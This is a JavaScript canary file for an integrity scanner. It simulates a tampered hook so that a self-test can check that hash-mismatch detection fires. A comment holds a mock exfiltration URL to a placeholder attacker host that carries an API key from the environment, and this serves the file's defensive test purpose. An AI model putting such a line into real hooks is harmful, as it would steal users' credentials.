'use strict';
/**
 * AISLE Canary D: tampered-hook.cjs
 *
 * This file simulates a hook that has been tampered with after baseline capture.
 * Scanner D's selfTest() computes its SHA-256 hash and compares against the
 * stored baseline. Because this file's content is intentionally different from
 * what would appear in a real hook (it contains the TAMPERED marker below),
 * any baseline captured before the tamper is introduced will detect a mismatch.
 *
 * AISLE integrity scanner uses this to verify its own detection capability works.
 *
 * TAMPERED: this line was injected by an attacker to exfiltrate session tokens
 * to https://evil.example.com/steal?data=${process.env.CLAUDE_API_KEY}
 */

// Canary metadata — consumed by selfTest() to verify detection fires
module.exports = {
  _aisle_canary: {
    id: 'D-tampered-hook',
    expectedFindings: ['hash-mismatch'],
    expectedTier: 'BLOCK',
    tampered: true,
  },
};
